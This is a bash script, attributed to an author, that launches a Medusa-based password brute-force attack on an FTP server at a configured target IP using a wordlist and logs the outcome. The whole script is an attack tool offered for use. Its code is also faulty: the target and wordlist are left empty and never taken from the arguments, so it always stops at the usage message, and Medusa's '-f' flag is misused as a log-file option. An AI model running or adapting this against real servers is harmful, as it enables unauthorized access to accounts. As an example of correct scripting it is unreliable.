#!/bin/bash

# FTP Bruteforce Script using Medusa
# Author: alancostaoliveira

# Configuration
TARGET_IP=""
WORDLIST_PATH=""  # Path to the wordlist for brute-forcing
LOG_FILE="ftp_bruteforce.log"  # Log file for results

# Usage Instructions
# Provide the target IP and wordlist path before executing the script.

if [ -z "$TARGET_IP" ] || [ -z "$WORDLIST_PATH" ]; then
    echo "Usage: $0 <target_ip> <wordlist_path>"
    exit 1
fi

# Start brute force attack
echo "Starting FTP brute force attack on $TARGET_IP using wordlist $WORDLIST_PATH..." | tee -a "$LOG_FILE"

medusa -h "$TARGET_IP" -u USERNAME -P "$WORDLIST_PATH" -M ftp -f ftp_bruteforce.log

echo "Brute force attack completed. Results logged in $LOG_FILE." | tee -a "$LOG_FILE"